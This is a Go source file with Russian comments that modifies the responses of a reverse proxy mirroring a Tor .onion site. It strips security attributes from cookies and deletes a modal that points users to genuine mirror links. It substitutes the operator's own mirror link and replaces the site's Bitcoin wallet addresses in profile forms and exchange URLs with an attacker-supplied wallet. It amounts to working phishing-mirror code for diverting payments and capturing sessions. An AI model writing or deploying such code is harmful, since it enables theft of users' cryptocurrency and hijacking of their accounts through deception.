package modification

import (
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

type ResponseModifier struct {
	ProxyHost   string
	WalletBTC   string
	MirrorLink  string
}

// Modify изменяет ответ сервера
func (r *ResponseModifier) Modify(resp *http.Response) error {
	// Удаляем проблемные cookie атрибуты
	for i, c := range resp.Header["Set-Cookie"] {
		c = regexp.MustCompile(`(?i)\s*domain=[^;]+\s*;?\s*`).ReplaceAllString(c, "")
		c = regexp.MustCompile(`(?i)\s*secure\s*;?\s*`).ReplaceAllString(c, "")
		c = regexp.MustCompile(`(?i)\s*samesite=[^;]+\s*;?\s*`).ReplaceAllString(c, "")
		resp.Header["Set-Cookie"][i] = c
	}

	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	content := string(body)

	ct := resp.Header.Get("Content-Type")
	if strings.Contains(ct, "text/html") {
		content = r.modifyHTML(content)
	}

	resp.Body = io.NopCloser(strings.NewReader(content))
	resp.ContentLength = int64(len(content))
	resp.Header.Set("Content-Length", strconv.Itoa(len(content)))
	return nil
}

// modifyHTML удаляет модали и заменяет wallet
func (r *ResponseModifier) modifyHTML(content string) string {
	// 1. Удаляем modal с новыми ссылками
	content = removeModalNewLinks(content)

	// 2. Заменяем mirror ссылку в copy-link
	content = replaceMirrorLink(content, r.MirrorLink)

	// 3. Заменяем wallet в profile/finances
	content = replaceWallet(content, r.WalletBTC)

	// 4. Заменяем wallet в query параметрах exchange
	content = replaceExchangeWallet(content, r.WalletBTC)

	// 5. Заменяем ссылки onion на proxy
	content = replaceOnionLinks(content, r.ProxyHost)

	return content
}

// removeModalNewLinks удаляет modal с новыми ссылками
func removeModalNewLinks(content string) string {
	// Удаляем <div class="modal modal-signup open" ... до </div> (последний div модала)
	re := regexp.MustCompile(`<div class="modal modal-signup[^>]*>.*?</div>\s*</div>\s*</div>`)
	content = re.ReplaceAllString(content, "")
	return content
}

// replaceMirrorLink заменяет ссылку зеркала проекта
func replaceMirrorLink(content, mirrorLink string) string {
	// Заменяем <p class="copy-link__text">kr1rfqodidvlh4aa337cpzfrhdlfldhve5nf7njhumwr7instad.onion
	re := regexp.MustCompile(`<p class="copy-link__text">[^<]*\.onion[^<]*</p>`)
	replacement := `<p class="copy-link__text">` + mirrorLink + ` — все зеркала проекта</p>`
	content = re.ReplaceAllString(content, replacement)
	return content
}

// replaceWallet заменяет wallet в profile/finances input
func replaceWallet(content, wallet string) string {
	// <input ... name="wallet" value="bc1qmqgq9kvhwprxnrwkmu09xgjezucn9wkcf8s2gg">
	re := regexp.MustCompile(`(<input[^>]*name="wallet"[^>]*value=")([^"]*)(")`)
	content = re.ReplaceAllString(content, `${1}`+wallet+`${3}`)
	return content
}

// replaceExchangeWallet заменяет wallet в URL параметрах exchange
func replaceExchangeWallet(content, wallet string) string {
	// /exchange/?wallet=bc1qmqgq9kvhwprxnrwkmu09xgjezucn9wkcf8s2gg
	re := regexp.MustCompile(`(/exchange/\?[^"]*wallet=)([a-zA-Z0-9]+)`)
	content = re.ReplaceAllString(content, `${1}`+wallet)
	return content
}

// replaceOnionLinks заменяет onion ссылки на proxy ссылки
func replaceOnionLinks(content, proxyHost string) string {
	// (https?)://([a-z2-7]{16,56}\.onion)(:\d+)?
	re := regexp.MustCompile(`(https?)://([a-z2-7]{16,56}\.onion)(:\d+)?`)
	content = re.ReplaceAllStringFunc(content, func(match string) string {
		u, _ := url.Parse(match)
		u.Scheme = "http"
		u.Host = proxyHost
		return u.String()
	})

	// Заменяем //onion.onion на //proxyHost
	re2 := regexp.MustCompile(`//[a-z2-7]{16,56}\.onion`)
	content = re2.ReplaceAllString(content, "//"+proxyHost)

	return content
}
